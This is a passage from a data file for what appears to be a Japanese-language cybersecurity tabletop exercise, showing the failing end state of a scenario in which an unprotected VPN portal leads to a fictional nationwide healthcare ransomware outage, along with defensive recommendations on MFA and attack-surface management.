            'ランサムウェア攻撃者への身代金支払いは仲間割れや再恐喝を招くだけであり、決して根本解決にならないことを経営陣と平時から合意形成しておく'
          ]
        }
      },

      vpn_03_terminal_breached_f: {
        id: 'vpn_03_terminal_breached_f',
        phase: '訓練終了: 事後評価 (After Action Review)',
        title: '【Fランク】単一ポータルのMFA欠如が招いた国家規模の医療インフラ壊滅',
        description: '全社の中で「たった1台残っていたMFAなしのレガシーVPNポータル」を放置したこと、そして初動でのパスワード変更ミスや身代金交渉への依存が、全国の病院・薬局を巻き込む未曾有の医療大混乱を引き起こしました。',
        severity: 'critical',
        situationSummary: '全国医療網の長期停止。数千億円規模の経済損失と経営陣の引責解任。',
        telemetryLogs: [
          { timestamp: '12:00:00', source: 'Congressional Hearing', level: 'CRITICAL', message: 'CEO and Board of Directors subpoenaed for hearing on systemic healthcare cybersecurity failure.' }
        ],
        choices: [],
        isTerminal: true,
        terminalOutcome: {
          grade: 'F',
          title: '最も弱い環（Weakest Link）から崩壊した基幹インフラ',
          summary: 'どれだけ堅牢な最新セキュリティを導入していても、「MFAのない旧ポータルが1つ存在するだけ」で防壁は無意味となります。アタックサーフェス管理（ASM）の怠慢が致命傷となりました。',
          financialEstimate: '被害損害額: 約1,200億円（身代金無駄金・復旧費用・医療機関支援損失・株主訴訟）',
          legalImpact: '議会公聴会での召喚、HIPAA重大違反による天文学的制裁金、集団損害賠償訴訟。',
          complianceStatus: '主要公的認証の取消、事業ライセンスの停止危機',
          recommendedPractices: [
            '「社外に公開されているすべてのIP・ポート・ポータル」を外部アタックサーフェス管理（EASM）ツールで常時自動棚卸しする',
            '例外なくすべてのリモートアクセスにMFAを強制し、レガシー認証（BASIC認証・MFA非対応プロトコル）をゲートウェイレベルで完全無効化する'
          ]
        }
      }
    }
  }

];
